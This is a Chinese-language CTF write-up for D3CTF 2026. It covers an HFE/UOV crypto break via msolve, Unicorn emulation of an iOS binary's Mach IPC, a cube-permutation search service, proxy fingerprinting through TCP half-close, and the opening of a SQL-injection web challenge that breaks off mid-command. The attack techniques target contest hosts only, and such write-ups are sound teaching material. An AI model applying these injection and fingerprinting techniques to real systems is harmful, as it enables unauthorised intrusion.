---
title: 【先知】D3CTF 2026 Web/Misc/Reverse/Crypto 方向 WriteUp
source: https://xz.aliyun.com/news/92588
source_host: xz.aliyun.com
clip_date: 2026-07-28T17:07:00+08:00
trace_id: 16b01021-a3bb-40c9-94ff-451bbd8af7db
content_hash: 9d6437bf42b503085ab61ee3bfb91d35872729ef0518860e553634d49657020a
status: synced
tags:
  - 先知
  - CTF
  - 密码学
series: null
feed_source: null
ai_summary: 在 GF(3) 上的超定二次方程可通过直接求解恢复 flag；iOS 应用通过 Unicorn 模拟 Mach IPC 绕过逆向；魔方状态可通过 shadow hash 反推命令映射并结合搜索求解；TCP 半关闭可区分代理类型；Web 题通过 SQL 注入泄露隐藏接口并复现加密通信获取管理员令牌。
ai_summary_style: key-points
images_status:
  total: 0
  succeeded: 0
  failed_urls: []
notion_page_id: 3ab75244-d011-812b-83a6-e43d1b980e1f
ioc:
  cves: []
  cwes: []
  hashes:
    - 04f9654471407af9db118e1cb7333bba
    - 0b9b129aa28776bf759aa8f32ad8f6712f2468ea30a5de05873c67e9e8406f14
    - 1829670b437f5d952df05bb7b4440772372e83c22ec799452d5da08a7957204b
    - 2f3020c9e47b6e88910118bb8f7fb7b7a1b0d1cb4f7ddc1a44ad3fb2aa387b44
    - 5d0185499f64d3116843ddcb3dd16344
    - 73cfa9f8eafad4b574970ae9ced11c67
    - 850cc4fbaec3d35b97381692b41842def2a7d08030cfbd71575434cd390f302e
    - ae77cf9d8f8e8c39a28cbc589d7ec9ea
    - d418e1a02f2f607a3d0f23a3cc1b9091
    - d558839bec55aa51660ed65d6ae42697377f29bd65f54e950bbe1a0d6c834abb
    - fe291443882d55af94bff1f9cddffb73
  domains: []
  tools: []
  techniques: []
---

> 💡 **AI 总结（key-points）**
>
> 在 GF(3) 上的超定二次方程可通过直接求解恢复 flag；iOS 应用通过 Unicorn 模拟 Mach IPC 绕过逆向；魔方状态可通过 shadow hash 反推命令映射并结合搜索求解；TCP 半关闭可区分代理类型；Web 题通过 SQL 注入泄露隐藏接口并复现加密通信获取管理员令牌。
> 
> - **加密题 HFERP：** 直接在 GF(3) 上建立 53 个超定二次方程和 31 个域方程，使用 `msolve` 的 F4 算法求解，无需恢复 HFE/UOV 私钥，从 7 个密文块恢复 flag。
> - **逆向题 PacMan：** 在 Unicorn 中装载 ARM64 Mach-O，挂钩 Mach 消息发送/接收函数，将请求重定向到二进制内部的 actor 处理器，并利用 RC4 解密器直接解密内置密文获得 flag。
> - **杂项题 PRISM’s end BLACKBOX：** 建立物理转动库，用每轮 5 次 `shadow` trace 的哈希比对推导出命令到物理轴/层/方向的映射，再通过双向 BFS 和 beam search 求解目标状态还原步骤，连续打开 7 个 seal。
> - **杂项题 Proxyport：** 向代理发送未以空行结束的 HTTP 请求头并关闭写端，若后端返回 `400 Bad Request` 则为 gost，若超时无响应则为 frp，每轮仅用一次探针完成 20 轮判断。
> - **Web 题 Ghost Zero：** 通过 SQL 注入泄露 `sqlite_dbpage` 内已删除的 pcap 记录，下载后恢复旧版 `/ddddddtestStat` 接口；复现前端 ECDH+AES-GCM 加密流程，通过 gateway 调用该接口换取 `exchangeTicket`，再换取 admin token 读取 `/api/flag`。

## Crypto

### D3HFERP

#### 题目描述

附件给出 `chall.sage` 、 `pubkey.txt` 与 `ciphertext.txt` 。题目在 GF(3) 上构造 31 个输入变量、53 个输出方程的混合 HFE/UOV 公钥映射，公开密钥由一组二次多项式组成。 `ciphertext.txt` 中有 7 个密文块，每块是 53 个 GF(3) 元素。目标是恢复加密的 flag。

源码中的公钥加密为：  
$y_k=x^T P_kx+L_kx+R_k,\\qquad 0\\le k<53$,其中 $x\\in\\mathbb F_3^{31}$。

明文编码函数 `blocks()` 会把  
`len(flag).to_bytes(2, "little") + flag` 解释为小端整数，再依次取三进制最低位，每 31 个三进制位组成一个输入向量。

#### 分析过程

`pubkey.txt` 的首行给出参数 `3 31 53` 。随后每个方程占三行：上三角二次型、31 个线性系数和常数项。因为源码保存的是对称矩阵$P_k$的上三角部分，恢复多项式时必须注意非对角项在$x^TP_kx$中出现两次：

$f_k(x)=R_k-y_k+\\sum_i L\_{k,i}x_i+ \\sum_i P\_{k,i,i}x_i^2+ \\sum\_{i<j}2P\_{k,i,j}x_ix_j.$

直接对单个块建立这 53 个二次方程，并增加域方程$x_i^3-x_i=0\\quad(0\\le i<31)$

即可把解限制在 GF(3)。本题虽然带有 HFE/UOV 结构，但在这个参数下系统高度超定；使用 `msolve` 的 F4 实现可以直接得到每个块的唯一 GF(3) 解，无需恢复私钥变换$U,T$。

下面的脚本把指定密文块转换为 `msolve` 的输入格式。它读取附件原始文件，按上述系数关系输出 53 个方程和 31 个域方程。

```python
# prepare_msolve.py
from pathlib import Path
import sys

root = Path(__file__).parent
block = int(sys.argv[1])

with (root / "pubkey.txt").open() as f:
    q, n, m = map(int, f.readline().split())
    public = []
    for _ in range(m):
        upper = list(map(int, f.readline().split()))
        linear = list(map(int, f.readline().split()))
        constant = int(f.readline())
        public.append((upper, linear, constant))

with (root / "ciphertext.txt").open() as f:
    _, _, count = map(int, f.readline().split())
    ciphertexts = [list(map(int, f.readline().strip())) for _ in range(count)]

if not 0 <= block < count:
    raise ValueError("invalid block")

def term(coef, monomial):
    coef %= q
    if coef == 0:
        return None
    if not monomial:
        return str(coef)
    return monomial if coef == 1 else f"{coef}*{monomial}"

polynomials = []
for target, (upper, linear, constant) in zip(ciphertexts[block], public):
    pieces = [term(constant - target, "")]
    pos = 0
    for i in range(n):
        for j in range(i, n):
            coef = upper[pos] * (1 if i == j else 2)
            mono = f"x{i}^2" if i == j else f"x{i}*x{j}"
            pieces.append(term(coef, mono))
            pos += 1
    pieces.extend(term(coef, f"x{i}") for i, coef in enumerate(linear))
    polynomials.append("+".join(x for x in pieces if x) or "0")

polynomials.extend(f"x{i}^3-x{i}" for i in range(n))
out = root / f"block{block}.ms"
out.write_text(",".join(f"x{i}" for i in range(n)) + "\n3\n" + ",\n".join(polynomials))
print(out)
```

将脚本和题目附件放在同一目录，依次生成七个系统：

```bash
for i in 0 1 2 3 4 5 6; do
  python3 prepare_msolve.py "$i"
done
```

`msolve` 可以从其发布源码构建，或使用已构建二进制。每个块执行：

```bash
msolve -t 4 -v 2 -f block0.ms -o block0.out
```

首块的 F4 过程首先产生如下关键规模：

```latex
deg     sel   pairs        mat          density            new data
  2      48      58      53 x 528        66.57%       48 new
  3     322     330    1727 x 5984        5.24%      322 new
  4    4515    4563   24947 x 47404       2.85%
```

所有七个输出均为零维、次数为 1 的参数化解。 `msolve` 输出中的 `result[1][4]` 标识参数变量；本题为 `x30` 。 `result[1][5][1][0]` 是该块的消元多项式$a+bt$，其根为$t=-a/b\\pmod3$。其余 30 个坐标是常数多项式，但按 `msolve` 的参数化约定需要取相反数。

这里不能把参数变量固定为一个常数。七个块的参数根分别为：

```latex
[1, 2, 0, 0, 0, 1, 0]
```

以下脚本读取七个 `block*.out` ，恢复完整的 31 元向量，拼接三进制位并按源码的 little-endian 规则转回字节：

```python
# decode_msolve.py
import ast
from pathlib import Path

root = Path(__file__).parent

def constant_value(poly):
    if poly == [[-1, [0]]]:
        return 0
    assert len(poly) == 1 and poly[0][0] == 0
    return poly[0][1][0] % 3

def linear_root(poly):
    degree, coeffs = poly
    assert degree == 1 and len(coeffs) == 2
    a, b = (value % 3 for value in coeffs)
    assert b != 0
    return (-a * pow(b, -1, 3)) % 3

digits = []
for block in range(7):
    data = ast.literal_eval(
        (root / f"block{block}.out").read_text().replace("\n", "").replace(":", "")
    )
    parameter_axis = data[1][4]
    parameter_index = parameter_axis.index(1)
    parametrization = data[1][5][1]

    parameter = linear_root(parametrization[0])
    coordinates = [(-constant_value(poly)) % 3 for poly in parametrization[2]]
    coordinates.insert(parameter_index, parameter)
    assert len(coordinates) == 31
    digits.extend(coordinates)
    print(f"block {block}: x{parameter_index} = {parameter}")

number = sum(digit * 3**index for index, digit in enumerate(digits))
raw = number.to_bytes((number.bit_length() + 7) // 8, "little")
size = int.from_bytes(raw[:2], "little")
print("length =", size)
print(raw[:2 + size])
```

运行输出为：

```latex
block 0: x30 = 1
block 1: x30 = 2
block 2: x30 = 0
block 3: x30 = 0
block 4: x30 = 0
block 5: x30 = 1
block 6: x30 = 0
length = 38
b'&\x00d3ctf{S1mpl3_Att4ck_br34ks_HFERP_2026}'
```

前两个字节 `26 00` 是小端长度 `38` ，与后续 flag 字节数一致。因此最终得到：

```latex
d3ctf{S1mpl3_Att4ck_br34ks_HFERP_2026}
```

## Reverse

### PacMan

#### 题目描述

附件为 iOS 应用 `pacman.ipa` 。解压后只有 `Payload/MachActorVM.app/MachActorVM` 和 `Info.plist` ；后者给出的显示名为 `Pac-Man` ，可执行文件名为 `MachActorVM` 。应用表面上是一个迷宫游戏，界面文本包含：

```latex
score:%06u/%06u  beans:%05u  moves:%05u
```

目标是恢复程序在通关后的真实输出。

#### 分析过程

IPA 本质上是 ZIP 文件，可以先解出 Mach-O：

```powershell
tar -xf .\pacman.ipa
Get-ChildItem .\Payload\MachActorVM.app
```

可执行文件是未加密的 ARM64 Mach-O。 `__objc_methlist` 中的 `ViewController` 方法给出了游戏主线： `restartGame` 、 `directionUp` 、 `directionDown` 、 `directionLeft` 、 `directionRight` 、 `stepGame:` 和 `updateWithFrame:`。迷宫位于 `__TEXT,__cstring` ，共 25 列、13 行； `stepGame:` 会将方向传给 `0x100007a68` ，该函数维护位置、分数、豆子数和步数。分数达到 `10000` 时，全局完成标志被置位。

`updateWithFrame:` 在完成标志置位后调用 `0x100005c7c` 。这个函数并不直接显示结果，而是进行 288 轮状态校验，最后在 `0x100006a1c` 解密 40 字节数据。该函数的结构是标准 RC4：先以八字节状态构造长度 256 的置换表，再对 `__TEXT,__cstring + 0x3a0` 的密文执行 PRGA。密文为：

```latex
3b9e145d9dc72295907788ecee4ab0cfecdfeb5d85abeb916081e698a7ae8665b13de3d3959ea556
```

难点在于 `0x100005c7c` 通过 Mach message 与四个 actor 交互。对应的请求函数是 `0x100006384` ，它按记录首字段选择 actor；actor 的三个核心处理器位于 `0x100005f18` 、 `0x100006100` 和 `0x100006290` 。这些处理器以及 RC4 都在附件自身的代码段中，不依赖 iOS UI。因而可以在 Unicorn 中装载 Mach-O，并把 IPC 收发改为直接跳转到同一二进制中的 actor 处理器。这样保留题目中的状态链和 RC4 计算，只替换宿主系统无法提供的 Mach IPC 外壳。

下面脚本以解压后的 `Payload/MachActorVM.app/MachActorVM` 为输入。需要安装 `unicorn` ：

```powershell
pip install unicorn
python .\solve.py
```

```python
# solve.py
from pathlib import Path
import struct

from unicorn import Uc, UC_ARCH_ARM64, UC_HOOK_CODE, UC_MODE_ARM
from unicorn.arm64_const import (
    UC_ARM64_REG_LR,
    UC_ARM64_REG_PC,
    UC_ARM64_REG_SP,
    UC_ARM64_REG_X0,
    UC_ARM64_REG_X1,
    UC_ARM64_REG_X2,
    UC_ARM64_REG_X21,
    UC_ARM64_REG_X23,
)


IMAGE = 0x100000000
STACK = 0x200000000
RETURN = 0x400000000
binary = Path("Payload/MachActorVM.app/MachActorVM").read_bytes()

uc = Uc(UC_ARCH_ARM64, UC_MODE_ARM)
uc.mem_map(IMAGE, 0x20000)
uc.mem_write(IMAGE, binary)
uc.mem_map(STACK, 0x20000)
uc.mem_map(RETURN, 0x1000)

# Make stack-canary and mach_task_self indirections valid in the standalone VM.
uc.mem_write(IMAGE + 0xc098, struct.pack("<Q", IMAGE + 0x1ff00))
uc.mem_write(IMAGE + 0xc0e8, struct.pack("<Q", IMAGE + 0x1ff08))
uc.mem_write(IMAGE + 0x1ff00, struct.pack("<Q", 1))
uc.mem_write(IMAGE + 0x1ff08, struct.pack("<I", 1))

# 0x6384 selects one of four actor ports.  Non-zero placeholders keep it on
# the normal request path; the receive hook below supplies the local reply.
uc.mem_write(IMAGE + 0x10c58, struct.pack("<4I", 1, 1, 1, 1))


def return_from_stub(value=0):
    uc.reg_write(UC_ARM64_REG_X0, value)
    uc.reg_write(UC_ARM64_REG_PC, uc.reg_read(UC_ARM64_REG_LR))


def code_hook(uc, address, size, _):
    # The environment gate is irrelevant to the encoded VM transition data.
    if address == IMAGE + 0x6668:
        return_from_stub(1)
        return

    # The worker result is returned through mach_msg; normalize the direct
    # handler return to KERN_SUCCESS and add the reply marker checked by 0x6384.
    if address == IMAGE + 0x65dc:
        uc.reg_write(UC_ARM64_REG_X0, 0)
    elif address == IMAGE + 0x6608:
        uc.mem_write(
            uc.reg_read(UC_ARM64_REG_X21) + 0x14,
            struct.pack("<I", 0x4D564901),
        )

    # mach_port_allocate(..., &port): return a non-zero synthetic port.
    if address == IMAGE + 0x7ef8:
        uc.mem_write(uc.reg_read(UC_ARM64_REG_X2), struct.pack("<I", 1))
        return_from_stub(0)
        return

    # 0x7eec is mach_msg.  A receive request is dispatched to the original
    # actor code with the request buffer and reply buffer used by 0x6384.
    if address == IMAGE + 0x7eec:
        option = uc.reg_read(UC_ARM64_REG_X1)
        if option == 2:
            sp = uc.reg_read(UC_ARM64_REG_SP)
            worker = uc.reg_read(UC_ARM64_REG_X23) & 3
            handler = (0x5F18, 0x6100, 0x6290, 0x6290)[worker]
            uc.reg_write(UC_ARM64_REG_X0, sp + 8)
            uc.reg_write(UC_ARM64_REG_X1, sp + 0x70)
            uc.reg_write(UC_ARM64_REG_PC, IMAGE + handler)
        else:
            return_from_stub(0)
        return

    # Remaining imported system calls are only IPC/runtime scaffolding here.
    if IMAGE + 0x7e8c <= address < IMAGE + 0x8000:
        return_from_stub(0)


uc.hook_add(UC_HOOK_CODE, code_hook)

frame = STACK + 0x100
plain = STACK + 0x300
scratch = STACK + 0x500
for reg, value in (
    (UC_ARM64_REG_X0, frame),
    (UC_ARM64_REG_X1, plain),
    (UC_ARM64_REG_X2, scratch),
    (UC_ARM64_REG_SP, STACK + 0x1f000),
    (UC_ARM64_REG_LR, RETURN),
):
    uc.reg_write(reg, value)

# ViewController's post-win verifier.
uc.emu_start(IMAGE + 0x5c7c, RETURN)
assert uc.reg_read(UC_ARM64_REG_X0) == 1
print(bytes(uc.mem_read(plain, 128)).split(b"\0")[0].decode())
```

关键输出如下：

```latex
d3ctf{GoOdjob!!!Y0u_@re_be5t_P4c-Man!!!}
```

脚本返回值为 `1` ，说明 `0x100005c7c` 完成了全部状态校验；打印内容来自其末尾调用的 RC4 解密函数，且长度恰好为内置密文的 40 字节。因此最终 flag 为：

```latex
d3ctf{GoOdjob!!!Y0u_@re_be5t_P4c-Man!!!}
```

## Misc

### PRISM's end BLACKBOX

#### 题目描述

题目无附件，只给出一个交互式 TLS 服务：

```bash
ncat --ssl roxx3wt22zziep42zfe3qylh3vu.cloud.d3c.tf 443
```

连接后服务端显示 `PRISM's end BLACKBOX` ，要求先回传一段反转后的 `mirror token` ，随后进入一个七层 seal 的交互系统。每个 opening 都会给出当前扫描到的 24 个 sticker id、允许的转动次数、剩余 `shadow` 次数、目标类型和校验规则。目标是在每个 opening 中用合法转动把当前扫描面调整到 oracle 给出的目标状态，连续打开 7 个 seal 后得到最终结果。

#### 分析过程

连上服务后先处理登录握手。服务端 banner 中有一行：

```latex
mirror token: <token>
```

把 `<token>` 反转后发送即可进入命令行。实际交互中确认可用命令主要有：

```latex
look ids <front|back|left|right|top|bottom>
scan ids
oracle
shadow <axis> <layer> <sign>
turn <axis> <layer> <sign>
verify
```

`look ids` 可以读出六个面共 150 个 sticker 的完整状态； `scan ids` 给出当前 opening 需要匹配的 24 个扫描槽位； `oracle` 给出本轮目标； `shadow` 不改变真实状态，只返回某个转动后的状态哈希； `turn` 才真正执行转动； `verify` 用于提交当前 opening。

题目中的转动命令每个 opening 都会随机改线，直接把 `turn roll low +` 理解成固定物理动作会失败。解决办法是先建立一份物理转动库，再用本轮的 `shadow` 结果反推出命令映射。对完整状态 `state` 执行物理转动后，服务端使用下面的哈希作为 `shadow` trace：

```python
import hashlib

def trace_state(state):
    return hashlib.blake2s(
        bytes(state),
        digest_size=12,
        person=b"PRISMv2",
    ).hexdigest()
```

实际复现时先保存一组校准数据：在同一初始状态下依次执行 9 个基础物理转动，记录每次 `look ids` 的完整状态。对相邻状态比较即可得到每个基础动作的 150 位 permutation，反向动作取逆置换。随后每个 opening 用 5 次 `shadow` 探测：

```latex
shadow roll low +
shadow pitch low +
shadow yaw low +
shadow roll mid +
shadow pitch mid +
```

把返回 trace 与本地物理转动库逐一比对，可以确定三件事：输入轴到物理轴的置换、输入层到物理层的置换，以及每个轴的正负号。 `low` 、 `mid` 两层观测到后，缺失的输入层和物理层由三层集合差直接补出。日志中一轮 wiring 的输出形如：

```latex
[wiring] observed={'roll low +': 'pitch mid -', 'pitch low +': 'yaw mid -', 'yaw low +': 'roll mid -', 'roll mid +': 'pitch high -', 'pitch mid +': 'yaw high -'}
[wiring] axis={'roll': 'pitch', 'pitch': 'yaw', 'yaw': 'roll'} layer={'low': 'mid', 'mid': 'high', 'high': 'low'} sign={'roll': '-', 'pitch': '-', 'yaw': '-'}
```

有了本轮 18 个命令对应的真实 permutation 后，所有 oracle 都可以转化为“若干 sticker 当前所在位置需要移动到若干目标位置”的搜索问题。前几层 oracle 类型较简单：

```latex
goal_type = selected_slots
goal_type = required_ids
goal_type = locked_match
```

其中 `selected_slots` 和 `locked_match` 都是精确位置匹配； `required_ids` 只要求指定 id 出现在 24 个扫描位置中。后续出现的 `cycle_program` 和 `local_delta` 会给出若干 cycle。服务端标注 `cycle_order = left_to_right` ，实际含义是 cycle `(a b c)` 中原来在 `a` 的 id 移到 `b` ，原来在 `b` 的 id 移到 `c` ，原来在 `c` 的 id 移到 `a` 。因此目标扫描数组可按下面方式生成：

```python
target_scan = meta["base_ids"][:]
constrained = set(meta["fixed_slots"] or meta["anchors"])
for cycle in meta["cycles"]:
    old = target_scan[:]
    constrained.update(cycle)
    for i, slot in enumerate(cycle):
        target_scan[cycle[(i + 1) % len(cycle)]] = old[slot]
slots = sorted(constrained)
targets = [target_scan[s] for s in slots]
```

最后一层出现新的目标类型：

```latex
goal_type = full_scan_match
target_ids = ...
rule = scan ids must equal target_ids
```

这个类型等价于 `selected_slots = 00 01 ... 23` ，即 24 个扫描槽位全部精确匹配 `target_ids` 。

位置搜索可以先把目标 id 映射成当前完整状态中的位置，再把扫描槽位映射成完整状态中的目标位置：

```python
loc = {v: i for i, v in enumerate(state)}
start = tuple(loc[t] for t in targets)
goal = tuple(scan_positions[s] for s in selected)
```

深度较浅时用双向 meet-in-the-middle。seal5、seal6 中有些目标需要 17 到 20 步，Python 搜索会很慢，因此使用 C++ 写了两个辅助程序： `exact_mitm` 负责 12 步以内精确双向搜索， `beam_search` 负责在 20/22 步预算内做较宽的启发式 beam。编译命令为：

```bash
g++ -O3 -std=c++17 exact_mitm.cpp -o exact_mitm
g++ -O3 -std=c++17 beam_search.cpp -o beam_search
```

beam 的评分只依赖当前匹配数量和每个 sticker 到目标位置的单点最短距离，不使用服务端额外信息：

```python
def score(positions, depth):
    fixed = sum(1 for p, g in zip(positions, goal) if p == g)
    total = sum(dist[p] for dist, p in zip(dist_tables, positions))
    worst = max(dist[p] for dist, p in zip(dist_tables, positions))
    return fixed * 10000 - total * 30 - worst * 200 - depth
```

由于外部 C++ 求解可能运行几十秒，期间连接空闲会被服务端断开。实际脚本在等待子进程结束时每 15 秒发送一次只读的 `scan ids` 作为 keepalive；该命令不会改变状态，也不会消耗 turn budget。

关键交互脚本的主循环如下，省略的函数分别负责解析 oracle、构造 wiring、调用 C++ 搜索并返回 move 列表：

```python
HOST = "roxx3wt22zziep42zfe3qylh3vu.cloud.d3c.tf"
PORT = 443

library = build_library("calibration4.txt")
client = Client()
print(client.connect(), end="")

while True:
    state = client.look_all()
    scan_ids, scan_text = client.scan_ids()
    loc_for_scan = {v: i for i, v in enumerate(state)}
    scan_positions = [loc_for_scan[v] for v in scan_ids]
    meta, oracle_text = client.oracle()

    command_perms, observed, axis_map, layer_map, sign_map = identify_wiring(
        client, state, library
    )

    if meta["goal_type"] == "selected_slots":
        path = solve_positions(
            state, scan_positions, meta["selected"], meta["targets"],
            command_perms, meta["turns_left"], client=client,
        )
    elif meta["goal_type"] == "required_ids":
        path = solve_required(
            state, scan_positions, meta["required"],
            command_perms, meta["turns_left"],
        )
    elif meta["goal_type"] == "locked_match":
        path = solve_positions(
            state, scan_positions,
            meta["locked_slots"] + meta["target_slots"],
            meta["locked_ids"] + meta["targets"],
            command_perms, meta["turns_left"], client=client,
        )
    elif meta["goal_type"] in ("cycle_program", "local_delta"):
        target_scan = meta["base_ids"][:]
        constrained = set(meta["fixed_slots"] or meta["anchors"])
        for cycle in meta["cycles"]:
            old = target_scan[:]
            constrained.update(cycle)
            for i, slot in enumerate(cycle):
                target_scan[cycle[(i + 1) % len(cycle)]] = old[slot]
        slots = sorted(constrained)
        path = solve_positions(
            state, scan_positions, slots, [target_scan[s] for s in slots],
            command_perms, meta["turns_left"], client=client,
        )
    elif meta["goal_type"] == "full_scan_match":
        path = solve_positions(
            state, scan_positions, list(range(len(meta["targets"]))),
            meta["targets"], command_perms, meta["turns_left"], client=client,
        )
    else:
        raise RuntimeError(f"unsupported goal type {meta['goal_type']}")

    print(f"[solve] seal={meta['seal']} opening={meta['opening']} depth={len(path)}")
    for move in path:
        print(f"turn {move}")
        print(client.cmd(f"turn {move}", timeout=120), end="")

    out = client.cmd("verify", timeout=120)
    print(out, end="")
    if "d3ctf" in out.lower():
        break
```

运行方式如下。脚本目录中需要放置校准得到的 `calibration4.txt` ，以及编译好的 `exact_mitm` 、 `beam_search` ：

```bash
python3 -u prism_solver.py > prism_newhost.out.log 2> prism_newhost.err.log
```

关键输出可以看到最后一层三个 opening 都是 `full_scan_match` ，并分别被 11、11、10 步解出：

```latex
seal 6/7 opens. the sixth lens clears.
seal 7/7 is now aligned.
goal_type = full_scan_match
[solve] seal=7 opening=1 depth=11
seal 7/7 opening 1/3 accepted.
seal 7/7 realigns for another opening.
goal_type = full_scan_match
[solve] seal=7 opening=2 depth=11
seal 7/7 opening 2/3 accepted.
seal 7/7 realigns for another opening.
goal_type = full_scan_match
[solve] seal=7 opening=3 depth=10
seal 7/7 opening 3/3 accepted.
seal 7/7 opens. the last lens clears.
the prism opens.
d3ctf{37e7139a-1cc0-12a6-d5c4-1382bd29c133}}
```

因此最终结果为：

```latex
d3ctf{37e7139a-1cc0-12a6-d5c4-1382bd29c133}
```

### Proxyport

#### 题目描述

题目给出两个 `ncat --ssl` 入口，一个是转发服务，一个是交互判题服务：

```latex
ncat --ssl rile4iqb4ji6bkdx6gutkldm4f4.cloud.d3c.tf 443
ncat --ssl r2bgtfecg6csp2yrh7cerzwcf5u.cloud.d3c.tf 443
```

实际连接时， `rile4iqb4ji6bkdx6gutkldm4f4.cloud.d3c.tf` 会返回 PoW banner，因此它是交互判题端；另一个入口作为转发端使用。

交互端连接后先要求完成 PoW，然后进入 20 轮判断。每轮最多允许 5 次 probe，需要判断当前转发端背后使用的是 `gost` 还是 `frp` ：

```latex
Welcome to Proxy Port Challenge.
You will solve 20 rounds. Each round allows at most 5 probing attempts.
== PoW ==
Find a suffix X so sha256(prefix || X) has 26 leading zero bits.
prefix: ae77cf9d8f8e8c39a28cbc589d7ec9ea
submit: pow <suffix>
```

正常提交 PoW 后会进入轮次：

```latex
pow ok
round 01/20 ready
submit `answer gost` or `answer frp`
```

#### 分析过程

PoW 的输入是交互端给出的十六进制字符串 `prefix` 和自己提交的十进制字符串后缀直接拼接，即 `sha256(prefix || suffix)` ，满足前 26 bit 为 0 后提交。每次连接的 `prefix` 会变化，后面的脚本会自动搜索可用后缀。

完成 PoW 后先用普通 HTTP 请求验证转发端的基本行为：

```bash
printf 'GET http://forward.service-service/ HTTP/1.1\r\nHost: forward.service-service\r\n\r\n' \
  | ncat --ssl r2bgtfecg6csp2yrh7cerzwcf5u.cloud.d3c.tf 443
```

完整请求会被正常转发到后端，返回的是同一类 HTTP 响应，因此无法区分 `gost` 和 `frp` 。本题真正有差异的是 TCP 半关闭语义：向代理发送一个没有以空行结束的 HTTP 请求头，然后让 `ncat` 因 stdin EOF 关闭发送方向。该行为会把“客户端已经不会再发送更多字节”这个状态暴露给代理。

探测命令如下：

```bash
printf 'GET http://forward.service-service/ HTTP/1.1\r\nHost: forward.service-service\r\n' \
  | timeout 2 ncat --ssl r2bgtfecg6csp2yrh7cerzwcf5u.cloud.d3c.tf 443
```

实测差异稳定：

```latex
HTTP/1.1 400 Bad Request
Content-Type: text/plain; charset=utf-8
Connection: close

400 Bad Request
```

出现 `400 Bad Request` 时说明半关闭被继续传给后端，后端确认请求头已经结束但格式不完整，因此可以判断为 `gost` 。如果 2 秒内没有任何响应，说明后端仍在等待后续请求头字节，判为 `frp` 。这里探测端使用 `ncat --ssl` 而不是 Python 的 `SSLSocket.shutdown()` ，是因为后者会额外影响 TLS close_notify/半关闭行为，和题目给出的 `ncat` 交互模型不完全一致。

#### 关键脚本

下面脚本用 Python 维护交互端 TLS 连接，PoW 完成后每轮调用一次 `ncat --ssl` 探测转发端；每轮只消耗 1 次 probe，低于题目限制的 5 次。

```python
#!/usr/bin/env python3
import hashlib
import multiprocessing as mp
import os
import re
import socket
import ssl
import subprocess
import time

FORWARD_HOST = os.environ.get("FORWARD_HOST", "r2bgtfecg6csp2yrh7cerzwcf5u.cloud.d3c.tf")
INTERACTIVE_HOST = os.environ.get("INTERACTIVE_HOST", "rile4iqb4ji6bkdx6gutkldm4f4.cloud.d3c.tf")


def recv_until(sock, marks, timeout=30):
    sock.settimeout(0.5)
    end = time.time() + timeout
    data = b""
    while time.time() < end:
        try:
            chunk = sock.recv(4096)
            if not chunk:
                break
            data += chunk
            if any(mark in data for mark in marks):
                return data
        except socket.timeout:
            pass
    return data


def pow_worker(prefix, start, step, outq):
    n = start
    while True:
        suffix = str(n).encode()
        digest = hashlib.sha256(prefix + suffix).digest()
        if digest[0] == 0 and digest[1] == 0 and digest[2] == 0 and digest[3] < 0x40:
            outq.put(suffix)
            return
        n += step


def solve_pow(prefix):
    workers = max(1, mp.cpu_count())
    outq = mp.Queue()
    procs = [mp.Process(target=pow_worker, args=(prefix, i, workers, outq)) for i in range(workers)]
    for proc in procs:
        proc.start()
    suffix = outq.get()
    for proc in procs:
        proc.terminate()
    for proc in procs:
        proc.join()
    return suffix


def probe_once():
    payload = (
        b"GET http://forward.service-service/ HTTP/1.1\r\n"
        b"Host: forward.service-service\r\n"
    )
    try:
        p = subprocess.run(
            ["timeout", "2", "ncat", "--ssl", FORWARD_HOST, "443"],
            input=payload,
            stdout=subprocess.PIPE,
            stderr=subprocess.PIPE,
            timeout=3,
        )
        text = p.stdout
    except subprocess.TimeoutExpired:
        text = b""
    return "gost" if b"400 Bad Request" in text else "frp", text


def main():
    ctx = ssl.create_default_context()
    ctx.check_hostname = False
    ctx.verify_mode = ssl.CERT_NONE

    raw = socket.create_connection((INTERACTIVE_HOST, 443), timeout=10)
    with ctx.wrap_socket(raw, server_hostname=INTERACTIVE_HOST) as sock:
        banner = recv_until(sock, [b"submit: pow"], timeout=20)
        print(banner.decode(errors="replace"))

        prefix = re.search(rb"prefix: ([0-9a-f]+)", banner).group(1)
        suffix = solve_pow(prefix)
        sock.sendall(b"pow " + suffix + b"\n")

        for _ in range(20):
            ready = recv_until(sock, [b"ready", b"All answers", b"d3ctf{"], timeout=20)
            print(ready.decode(errors="replace"), end="")
            if b"d3ctf{" in ready or b"All answers" in ready:
                break

            m = re.search(rb"round (\d+)/20", ready)
            rnd = int(m.group(1)) if m else -1
            ans, evidence = probe_once()
            sig = "400" if b"400 Bad Request" in evidence else "timeout"
            print(f"[round {rnd:02d}] probe={sig} => {ans}")
            sock.sendall(f"answer {ans}\n".encode())

        tail = recv_until(sock, [b"d3ctf{"], timeout=20)
        print(tail.decode(errors="replace"))


if __name__ == "__main__":
    main()
```

运行方式：

```bash
FORWARD_HOST=r2bgtfecg6csp2yrh7cerzwcf5u.cloud.d3c.tf \
INTERACTIVE_HOST=rile4iqb4ji6bkdx6gutkldm4f4.cloud.d3c.tf \
python3 solve.py
```

一次完整求解的关键输出如下。每轮的 `400` 表示判 `gost` ， `timeout` 表示判 `frp` ：

```latex
[round 01] probe=400 => gost
[round 02] probe=timeout => frp
[round 03] probe=400 => gost
[round 04] probe=timeout => frp
[round 05] probe=400 => gost
[round 06] probe=timeout => frp
[round 07] probe=400 => gost
[round 08] probe=400 => gost
[round 09] probe=timeout => frp
[round 10] probe=timeout => frp
[round 11] probe=timeout => frp
[round 12] probe=400 => gost
[round 13] probe=timeout => frp
[round 14] probe=400 => gost
[round 15] probe=400 => gost
[round 16] probe=400 => gost
[round 17] probe=timeout => frp
[round 18] probe=400 => gost
[round 19] probe=timeout => frp
[round 20] probe=timeout => frp
All answers are correct.
d3ctf{dIv3_1NtO-ThE_LOWEr-NEtW0rK-Layer-WILL_YOu_sE3-tHe_truth0}
```

最终得到：

```latex
d3ctf{dIv3_1NtO-ThE_LOWEr-NEtW0rK-Layer-WILL_YOu_sE3-tHe_truth0}
```

## Web

### Ghost Zero

#### 题目描述

题目只给出一个站点：

```latex
https://r3gdex54wethtgbuhsdtvu3j334.cloud.d3c.tf
```

主页是一个搜索框，正常搜索会返回动漫条目。题目的最终目标是获取 `/api/flag` 返回的 flag。

#### 分析过程

先确认服务在线：

```bash
curl -i https://r3gdex54wethtgbuhsdtvu3j334.cloud.d3c.tf/api/healthz
```

返回：

```latex
HTTP/1.1 200 OK
content-type: application/json; charset=utf-8
...

{"ok":true}
```

前端搜索功能本身就是注入点。直接把查询内容替换为联合查询，可以枚举表名：

```bash
GHOST_ZERO_BASE=https://r3gdex54wethtgbuhsdtvu3j334.cloud.d3c.tf \
